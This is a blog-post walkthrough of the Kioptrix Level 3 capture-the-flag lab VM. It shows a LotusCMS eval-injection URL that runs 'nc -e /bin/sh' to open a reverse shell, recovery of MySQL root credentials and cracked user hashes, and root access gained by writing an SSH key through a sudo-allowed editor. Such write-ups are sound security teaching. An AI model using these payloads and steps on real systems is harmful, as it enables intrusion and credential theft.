---
layout: single
title: Kioptrix Level 3 CTF Walkthrough
date: 2017-08-02
categories:
  - security
  - ctf
  - walkthrough
tags:
  - kioptrix
  - vulnhub
---
## Exploiting the Web Server
Running Nmap (`nmap -sS -sV -Pn -T4 -vv 192.168.22.131`) showed that only two services seemed to be exposed on this machine (SSH and Apache), so I jumped straight in to looking at the web server.

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
MAC Address: 00:0C:29:B4:4B:F7 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I started by poking around for potential injection points. The URL of the home page looked as if it may be susceptible to LFI, as the page name being specified seemed to be the name of a file (i.e. `?page=index`).

I tried a few different payloads, and when including a single quotation mark to see if anything was being drawn from the database, I retrieved a PHP syntax error that mentioned [eval'd](http://php.net/manual/en/function.eval.php) code.

After a bit of looking around the few pages initially available, including the login screen, I was able to confirm the CMS Software in use, which was Lotus. A quick search on Exploit-DB also confirmed that the eval issue I found was definitely exploitable (https://www.exploit-db.com/exploits/18565/).

With this vulnerability confirmed, I started up ncat on my machine (`ncat -l -n -v -p 5555`) and then visited `http://kioptrix3.com/index.php?page=index%27);${system(%27nc%20-e%20/bin/sh%20192.168.22.129%205555%27)};%23` to initialise the reverse shell; which ran in the context of the `www-data` account:

```shell_session
root@kali:~# ncat -l -n -v -p 5555
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 192.168.22.131.
Ncat: Connection from 192.168.22.131:58112.
whoami
www-data
```

## Reconnaissance
The first thing I noticed was that I could read the contents of the `loneferret` account's home directory. Checking this out revealed a `CompanyPolicy.README` file, which contained the contents:

```
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.

DG
CEO
```

For the time being, this wasn't of any use, as the `www-data` account had no sudo privileges.

Running `uname -a` and `cat /etc/lsb-release` confirmed that the box is running Ubuntu 8.04.3 and that the kernel is version 2.6.24-24. With this information in mind, I tried a few different exploits which should affect this version (the sock_sendpage and the raptor vulnerabilities), however, none were successfully executed.

With kernel exploits not going so well, I rewinded back a bit and headed over to the root folder for `kioptrix3.com` and then grep'd the folder for `localhost`, in an attempt to find the file that is making the connection to MySQL.

```shell_session
www-data@Kioptrix3:/home/www/kioptrix3.com$ grep "localhost" ./ -R
grep "localhost" ./ -R
grep: ./gallery/scopbin/911006.php.save: Permission denied
./gallery/gconfig.php:	$GLOBALS["gallarific_mysql_server"] = "localhost";
www-data@Kioptrix3:/home/www/kioptrix3.com$
```

Looking inside the file found by grep (`gallery/gconfig.php`) revealed the credentials of the root MySQL user:

```php
$GLOBALS["gallarific_mysql_server"] = "localhost";
$GLOBALS["gallarific_mysql_database"] = "gallery";
$GLOBALS["gallarific_mysql_username"] = "root";
$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
```

With these credentials, I was able to login to MySQL and retrieve the hashes of  two users (`dreg` and `loneferret`) which were reversible to their plain text counter parts (`Mast3r` and `starwars`):

```shell_session
www-data@Kioptrix3:/home/www/kioptrix3.com$ mysql -u root -p
mysql -u root -p
Enter password: fuckeyou

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| gallery            |
| mysql              |
+--------------------+
3 rows in set (0.00 sec)

mysql> use gallery;
use gallery;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+----------------------+
| Tables_in_gallery    |
+----------------------+
| dev_accounts         |
| gallarific_comments  |
| gallarific_galleries |
| gallarific_photos    |
| gallarific_settings  |
| gallarific_stats     |
| gallarific_users     |
+----------------------+
7 rows in set (0.00 sec)

mysql> select * from dev_accounts;
select * from dev_accounts;
+----+------------+----------------------------------+
| id | username   | password                         |
+----+------------+----------------------------------+
|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |
|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |
+----+------------+----------------------------------+
2 rows in set (0.00 sec)

mysql>

```

## Getting Root
The password found for the `loneferret` user in the MySQL database was shared across the same account on the system; allowing me to switch to that user:

```shell_session
www-data@Kioptrix3:/home/www/kioptrix3.com$ su loneferret
su loneferret
Password: starwars

loneferret@Kioptrix3:/home/www/kioptrix3.com$
```

With the message from earlier in mind, regarding the use of the `ht` binary (an interactive text editor), I [upgraded to a fully interactive shell](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) and ran the binary, using `sudo -u root /usr/local/bin/ht`.

As the program was running as `root`, I was able to edit any file on the system. So, I proceeded to create a new file containing a public SSH key, and saved it to `/root/.ssh/authorized_keys`:

![ht](/assets/images/kioptrix-level-3-ctf-walkthrough/ht.png)

**Note: if you're not sure how to navigate HT, hold the Alt key and use the highlighted letters / numbers on screen; e.g. Alt + F opens the File menu.**

With my public key now placed in root's `authorized_keys`, I was able to SSH in as `root` and read the flag file:

```shell_session
root@kali:~# ssh -i ./id_rsa root@192.168.22.131
Last login: Mon Apr 18 11:29:13 2011
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
root@Kioptrix3:~#
```
